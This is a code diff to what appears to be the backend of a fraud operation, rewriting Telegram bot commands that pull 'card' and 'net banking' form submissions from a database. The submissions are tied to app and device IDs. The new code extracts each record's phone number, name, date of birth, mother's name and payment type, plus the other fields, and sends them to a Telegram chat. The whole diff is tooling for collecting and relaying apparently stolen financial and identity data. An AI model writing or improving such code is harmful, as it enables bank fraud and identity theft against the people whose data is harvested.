@@ -1663,73 +1663,121 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
       return c.json({ ok: true });
     }
 
-    // /card — all card form data from DB
-    if (txt === '/card' || txt.startsWith('/card ')) {
-      const [cardRows, countRow] = await Promise.all([
+    // /card — all card form data
+    if (txt === '/card') {
+      const [rows, cntRow] = await Promise.all([
         sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' ORDER BY submitted_at DESC LIMIT 500`),
         sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%'`),
       ]);
-      const total = (countRow[0] as {c:string}).c;
-      let out = `<b>Card Form Data</b>  Total: <b>${total}</b>  Showing: ${(cardRows as unknown[]).length}\n\n`;
-      if ((cardRows as unknown[]).length === 0) { out += 'No card form data found.'; }
-      (cardRows as Array<Record<string,unknown>>).forEach((f, i) => {
-        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
-        const t = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) : '';
-        out += `${i+1}. [${f.app_id}][${f.device_id}] ${t}\n   ${fields.substring(0, 160)}\n`;
+      const total = (cntRow[0] as {c:string}).c;
+      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
+      let out = `<b>Card Form Data</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
+      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const data = f.data as Record<string,unknown>;
+        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
+        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
+        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
+        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
+        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
+        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
+        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
+        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
+        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
+        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
+        if (extra) out += `   ${extra.substring(0,100)}\n`;
+        out += `   ${dt}\n`;
+        out += `   ─────────────────────\n`;
       });
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
-    // /nb — all net banking form data from DB
-    if (txt === '/nb' || txt === '/netbanking' || txt.startsWith('/nb ')) {
-      const [nbRows, countRow] = await Promise.all([
+    // /nb — all net banking form data
+    if (txt === '/nb' || txt === '/netbanking') {
+      const [rows, cntRow] = await Promise.all([
         sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' ORDER BY submitted_at DESC LIMIT 500`),
         sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%net banking%'`),
       ]);
-      const total = (countRow[0] as {c:string}).c;
-      let out = `<b>Net Banking Form Data</b>  Total: <b>${total}</b>  Showing: ${(nbRows as unknown[]).length}\n\n`;
-      if ((nbRows as unknown[]).length === 0) { out += 'No net banking form data found.'; }
-      (nbRows as Array<Record<string,unknown>>).forEach((f, i) => {
-        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
-        const t = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) : '';
-        out += `${i+1}. [${f.app_id}][${f.device_id}] ${t}\n   ${fields.substring(0, 160)}\n`;
+      const total = (cntRow[0] as {c:string}).c;
+      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
+      let out = `<b>Net Banking Form Data</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
+      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const data = f.data as Record<string,unknown>;
+        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
+        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
+        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
+        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
+        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
+        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
+        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
+        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
+        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
+        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
+        if (extra) out += `   ${extra.substring(0,100)}\n`;
+        out += `   ${dt}\n`;
+        out += `   ─────────────────────\n`;
       });
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
-    // /card online — card form data with online filter
+    // /card online — card with online
     if (txt === '/card online' || txt === '/cardonline') {
-      const [rows, countRow] = await Promise.all([
+      const [rows, cntRow] = await Promise.all([
         sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%' ORDER BY submitted_at DESC LIMIT 500`),
         sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`),
       ]);
-      const total = (countRow[0] as {c:string}).c;
-      let out = `<b>Card + Online Form Data</b>  Total: <b>${total}</b>  Showing: ${(rows as unknown[]).length}\n\n`;
-      if ((rows as unknown[]).length === 0) { out += 'No card+online form data found.'; }
+      const total = (cntRow[0] as {c:string}).c;
+      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
+      let out = `<b>Card + Online</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
       (rows as Array<Record<string,unknown>>).forEach((f, i) => {
-        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
-        const t = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) : '';
-        out += `${i+1}. [${f.app_id}][${f.device_id}] ${t}\n   ${fields.substring(0, 160)}\n`;
+        const data = f.data as Record<string,unknown>;
+        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
+        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
+        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
+        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
+        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
+        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
+        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
+        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
+        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
+        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
+        if (extra) out += `   ${extra.substring(0,100)}\n`;
+        out += `   ${dt}\n`;
+        out += `   ─────────────────────\n`;
       });
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
-    // /nb online — net banking form data with online filter
+    // /nb online — net banking with online
     if (txt === '/nb online' || txt === '/nbonline') {
-      const [rows, countRow] = await Promise.all([
+      const [rows, cntRow] = await Promise.all([
         sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%' ORDER BY submitted_at DESC LIMIT 500`),
         sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`),
       ]);
-      const total = (countRow[0] as {c:string}).c;
-      let out = `<b>Net Banking + Online Form Data</b>  Total: <b>${total}</b>  Showing: ${(rows as unknown[]).length}\n\n`;
-      if ((rows as unknown[]).length === 0) { out += 'No net banking+online form data found.'; }
+      const total = (cntRow[0] as {c:string}).c;
+      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
+      let out = `<b>Net Banking + Online</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
       (rows as Array<Record<string,unknown>>).forEach((f, i) => {
-        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
-        const t = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) : '';
-        out += `${i+1}. [${f.app_id}][${f.device_id}] ${t}\n   ${fields.substring(0, 160)}\n`;
+        const data = f.data as Record<string,unknown>;
+        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
+        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
+        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
+        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
+        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
+        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
+        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
+        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
+        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
+        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
+        if (extra) out += `   ${extra.substring(0,100)}\n`;
+        out += `   ${dt}\n`;
+        out += `   ─────────────────────\n`;
       });
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
